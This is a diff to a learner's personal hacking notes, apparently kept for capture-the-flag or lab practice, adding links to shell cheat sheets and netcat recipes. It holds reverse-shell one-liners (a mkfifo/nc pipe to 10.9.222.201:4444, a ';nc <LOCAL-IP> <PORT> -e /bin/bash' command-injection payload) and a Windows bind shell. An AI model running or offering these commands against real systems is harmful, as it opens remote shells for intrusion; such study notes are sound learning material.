@@ -71,6 +71,7 @@ Random notes I've made while learning about hacking that might prove useful in t
 - maak een HTTP request naar de shell om hem te runnen
 - reverse shell cheat sheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 - other chear sheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- also nice source: https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
 
 ### Shell upgrade
 - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
@@ -85,7 +86,12 @@ Random notes I've made while learning about hacking that might prove useful in t
 - result: `mkfifo /tmp/uxto; nc 10.9.222.201 4444 0</tmp/uxto | /bin/sh >/tmp/uxto 2>&1; rm /tmp/uxto`
 
 ### Reverse Shell with command injection
-- `;nc -e /bin/bash`
+- on own pc: `sudo nc -lvnp 443`
+- on target: `;nc <LOCAL-IP> <PORT> -e /bin/bash`
+
+### Bind Shell from Windows PC
+- target pc: `nc -lvnp <port> -e "cmd.exe"`
+- own pc: `nc MACHINE_IP <port>`
 
 ## Test command execution
 - start tcpdump listener for ICMP: `sudo tcpdump ip proto \\icmp -i tun0`
